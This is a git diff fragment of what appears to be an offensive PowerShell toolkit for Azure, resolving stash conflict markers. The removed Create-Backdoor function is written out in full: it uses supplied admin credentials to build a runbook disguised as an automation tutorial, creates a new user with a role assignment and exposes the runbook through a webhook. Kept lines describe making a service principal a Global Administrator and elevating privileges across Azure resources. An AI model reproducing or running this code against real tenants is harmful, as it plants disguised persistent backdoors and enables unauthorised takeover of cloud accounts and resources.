->>>>>>> Stashed changes
 
     If($Runbook)
     {
@@ -1914,12 +1139,7 @@ function Invoke-AzureRunCommand
     }
 }
 
-<<<<<<< Updated upstream
-
-function Execute-Program
-=======
 function Invoke-AzureRunProgram
->>>>>>> Stashed changes
 {
  <#
 .SYNOPSIS
@@ -2107,90 +1327,6 @@ function Create-AzureBackdoor
     Creates a back door by creating a service principal and making it a Global Administrator.
 
 .PARAMETER
-<<<<<<< Updated upstream
-    -Username (Username you used to login to Azure with, that has permissions to create a Runbook and user)
-    -Password (Password to that account)
-    -Account (Azure Automation Account name)
-    -ResourceGroup (Resource Group)
-    -NewUsername (Username you want to create)
-    -NewPassword (Password for that new account)
-
-.EXAMPLE
-    Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
-#>
-        [CmdletBinding()]
-         Param(
-        [Parameter(Mandatory=$false)][String]$Account = $null,
-        [Parameter(Mandatory=$false)][String]$Username = $null,
-        [Parameter(Mandatory=$false)][String]$Password = $null,
-        [Parameter(Mandatory=$false)][String]$NewUsername = $null,
-        [Parameter(Mandatory=$false)][String]$NewPassword = $null,
-        [Parameter(Mandatory=$false)][String]$File = $null,
-        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
-     if($ResourceGroup -eq "")
-     {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
-     }
-     elseif($Account -eq "")
-     {
-        Write-Host "Requires an Automation Account name" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
-     }
-     elseif($Username -eq "")
-     {
-        Write-Host "Requires an Administrative username" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
-     }
-     elseif($Password -eq "")
-     {
-        Write-Host "Requires an Administrative password" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
-     }
-     elseif($NewUsername -eq "")
-     {
-        Write-Host "Requires a new username" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
-     }
-     elseif($NewPassword -eq "")
-     {
-        Write-Host "Requires a new password." -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
-     }
-     else
-     {
-            $date = (Get-Date).AddDays(7)
-            $formatted = $date.ToString("MM/dd/yyyy")
-            if($File)
-            {
-                Import-AzAutomationRunbook -Path .\$File -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
-            }
-            else
-            {
-                $SplitName=$NewUsername -split "@"
-                $DisplayName = $SplitName[0]
-            
-            
-                $data = "az login -u $Username -p $Password" | Out-File AzureAutomationTutorialPowerShell.ps1
-                $data2 = "az ad user create --display-name $DisplayName --password $NewPassword --user-principal-name $NewUsername" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-                $data4 = "az role assignment create --assignee $NewUPN --role Contributor" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-                Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
-                Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Name AzureAutomationTutorialPowerShell
-                Write-Host ""
-                Write-Host "--------------------"
-                Write-Host "COPY THE URI BELOW, IT IS NOT RETRIEVABLE. PASS IT INTO Execute-BackDoor TO RUN IT"
-                New-AzAutomationWebhook -Name "AzureAutomationTutorialPowerShell" -ResourceGroup $ResourceGroup -AutomationAccountName $Account -RunbookName "AzureAutomationTutorialPowerShell" -Force -IsEnabled $True -ExpiryTime $formatted
-                rm AzureAutomationTutorialPowerShell.ps1
-            }
-        }
-}
-
-function Execute-Backdoor
-{
- <#
-.SYNOPSIS
-    This runs the backdoor that is created with "Create-Backdoor
-=======
     -Password (What the password will be for the service principal.)
 
 .EXAMPLE
@@ -2213,7 +1349,6 @@ $body = @"
 }
 "@
 	$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri | Convertto-Json
->>>>>>> Stashed changes
 
 }
 
@@ -2485,9 +1620,6 @@ $assignments = az role assignment list --all --query "[?principalName=='$UID'].{
 			}
 		}
 }
-<<<<<<< Updated upstream
-
-=======
 
 function Get-AzureRolePermission
 {
@@ -2801,4 +1933,3 @@ function Set-ElevatedPrivileges
 		Write-Host "Success! Re-login for permissions to take effect. You can now add yourself as an Owner to any resources in Azure!" -ForegroundColor Green
 	}
 }
->>>>>>> Stashed changes
